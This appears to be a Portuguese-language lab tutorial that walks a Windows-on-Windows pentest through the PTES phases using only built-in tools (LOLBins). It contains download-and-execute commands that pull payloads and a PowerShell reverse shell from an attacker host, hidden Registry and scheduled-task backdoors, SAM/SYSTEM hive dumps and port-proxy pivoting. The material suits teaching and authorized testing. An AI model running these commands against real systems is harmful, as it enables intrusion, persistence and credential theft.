# Pentest com Windows Nativo (PTES + LOLBins)

Este documento descreve uma **simulação completa de pentest alinhada ao PTES (Penetration Testing Execution Standard)** utilizando **exclusivamente ferramentas nativas do Windows** (CMD, PowerShell e recursos built-in do Windows 10/11 e Windows Server 2016+).

Nenhuma ferramenta de terceiros é utilizada (Kali, Nmap, Metasploit, Wireshark etc).

Aqui o ataque acontece como no mundo real:  
**Windows atacando Windows usando LOLBins**.

---
![Fluxo PTES – Simulação Gray Box e Assumed Breach](docs/PTES_SIMULAÇÃO.png)
---

## Aviso crítico (2026)

⚠️ **IMPORTANTE**

- Conteúdo **exclusivamente educacional**
- Uso **somente em laboratório próprio**
- Execução sem autorização formal e escrita é **crime**
  - Art. 154-A do Código Penal  
  - LGPD  
  - Marco Civil da Internet
- Em ambientes reais, essas técnicas são usadas apenas por **red teams autorizados**

Resumo honesto:  
Se rodar isso fora de um lab → **não é pentest, é BO**.

---

## Fases PTES adaptadas para Windows nativo

> Comentário: mapeamento direto entre o PTES tradicional e atividades possíveis apenas com ferramentas nativas do Windows (LOLBins).

| Fase PTES | Ferramentas nativas | Objetivo |
|---------|-------------------|----------|
| Pre-engagement | Word / Notepad | Escopo, regras, autorização |
| Intelligence Gathering | ping, nslookup, netstat, systeminfo | Reconhecimento |
| Threat Modeling | PowerShell, net view, Get-AD* | Mapeamento de ativos |
| Vulnerability Analysis | Get-HotFix, wmic, netstat | Enumeração |
| Exploitation | certutil, bitsadmin, schtasks, PowerShell | LOLBins |
| Post Exploitation | net user, reg, schtasks, netsh | Persistência / pivot |
| Reporting | Out-File, Export-Csv | Evidências |

---

## Ambiente de teste sugerido

> Comentário: cenário de *assumed breach*, com acesso inicial e credenciais low-priv.

- **Atacante:** Windows 11 (PC ou VM)
- **Vítima:** Windows 10/11 (VM)
- **IP testado:** `ip`
- **Rede:** Interna (Host-Only ou NAT)
- **Credenciais:** Usuário low-priv previamente obtido

---

## 1. Intelligence Gathering (Recon)

> Comentário: fase de reconhecimento inicial para entender identidade, sistema, rede e superfície de ataque.

### Identidade e contexto

```powershell
whoami /all
```

> Comentário: identifica usuário, grupos, privilégios e contexto de execução.

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

> Comentário: coleta informações do SO e arquitetura.

### Ping sweep simples

```powershell
1..254 | ForEach-Object {
  Test-Connection -ComputerName 192.168.56.$_ -Count 1 -Quiet -ErrorAction SilentlyContinue
} | ForEach-Object {
  "ip.$_"
}
```

> Comentário: enumeração básica de hosts ativos.

### DNS lookup

```powershell
nslookup
```

Entrada interativa:

```
server 8.8.8.8
www.alvo.com
```

> Comentário: valida resolução DNS.

### Portas em escuta

```cmd
netstat -ano | findstr "LISTENING"
```

> Comentário: identifica serviços ativos e PIDs.

### Shares visíveis

```cmd
net view \ip
```

> Comentário: enumera compartilhamentos SMB.

---

## 2. Vulnerability Analysis (Enumeração)

> Comentário: identificação de falhas de configuração e superfícies exploráveis.

### Patches instalados

```powershell
Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 10
```

> Comentário: verifica atrasos de patching.

### Serviços em execução

```powershell
Get-Service | Where-Object {$_.Status -eq "Running"} | Select Name, DisplayName, Status
```

> Comentário: identifica serviços que podem ser abusados.

### Usuários e grupos locais

```cmd
net user
```

```cmd
net localgroup administrators
```

```powershell
Get-LocalUser | Select Name, Enabled, LastLogon
```

> Comentário: enumeração de contas e privilégios.

### Firewall

```powershell
Get-NetFirewallRule |
Where-Object {$_.Enabled -eq $true -and $_.Direction -eq "Inbound"} |
Select DisplayName, Action, Protocol
```

> Comentário: identifica regras permissivas.

### WMI

```powershell
Get-WmiObject -Class Win32_ComputerSystem
```

```powershell
Get-WmiObject -Class Win32_LogicalDisk -ComputerName ip
```

> Comentário: coleta informações de sistema e discos.

---

## 3. Exploitation (Living-off-the-Land)

> Comentário: execução e movimento usando apenas binários legítimos do Windows.

### WinRM / PowerShell Remoting

Na vítima (uma vez):

```powershell
Enable-PSRemoting -Force
```

> Comentário: habilita gerenciamento remoto.

Do atacante:

```powershell
Enter-PSSession -ComputerName ip -Credential (Get-Credential)
```

```powershell
whoami
```

> Comentário: valida execução remota.

### Execução remota via Scheduled Task

```cmd
schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1')" /SC once /ST 00:00 /F
```

> Comentário: execução como SYSTEM.

### Método legado

```cmd
at \\ip 07:30 "cmd /c whoami > C:\temp\owned.txt"
```

> Comentário: técnica antiga ainda funcional.

---

## Download & Exec com LOLBins

> Comentário: download e execução usando ferramentas assinadas pela Microsoft.

### certutil

```cmd
certutil -urlfetch -f http://ip/nc.exe C:\Windows\Temp\nc.exe
```

### bitsadmin

```cmd
bitsadmin /transfer job /download /priority normal http://192.168.56.10/shell.bat C:\Temp\shell.bat
```

### PowerShell DownloadString

```powershell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/Invoke-PowerShellTcp.ps1')"
```

---

## 4. Post Exploitation

> Comentário: persistência, coleta de dados e pivoting.

### Persistência (Registry Run)

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "Updater" `
-Value "powershell -WindowStyle Hidden -File C:\temp\backdoor.ps1" `
-PropertyType String
```

### Persistência (Scheduled Task)

```cmd
schtasks /create /tn "WindowsUpdateCheck" /tr "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1'))" /sc onlogon /ru SYSTEM /f
```

### Dump de hives (se admin)

```cmd
reg save HKLM\SAM C:\temp\sam.hive
```

```cmd
reg save HKLM\SYSTEM C:\temp\system.hive
```

> Comentário: extração de material sensível.

### Pivoting

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.56.200
```

---

## 5. Reporting

> Comentário: coleta de evidências.

```powershell
whoami /all > C:\temp\report.txt
```

```powershell
systeminfo >> C:\temp\report.txt
```

```powershell
Get-HotFix | Export-Csv C:\temp\hotfixes.csv -NoTypeInformation
```

```powershell
Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\evidence.zip
```

---

## Limitações reais (2026)

- Enumeração limitada sem scanners dedicados  
- Dependência de misconfigurations  
- Alta detecção por Defender / EDR  
- Extremamente forte em Active Directory  

---

## Conclusão

> Se isso passa batido no SOC, o problema não é o ataque.  
> É o SOC.

Windows contra Windows.
